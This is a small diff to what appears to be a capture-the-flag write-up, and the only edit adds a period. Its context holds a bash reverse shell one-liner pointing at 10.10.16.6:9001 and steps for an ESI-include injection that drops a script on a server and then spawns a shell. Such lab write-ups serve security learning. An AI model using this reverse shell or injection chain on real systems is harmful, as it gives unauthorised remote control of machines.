@@ -72,5 +72,5 @@ bash -i >& /dev/tcp/10.10.16.6/9001 0>&1
 </esi:include>
 ```
 
-- now run the search ticket query and the bash script will be made on the remote server
+- now run the search ticket query and the bash script will be made on the remote server.
 - edit the `esi.xsl` script on you machine to run the command that'll run the bash script and spawn a reverse shell.
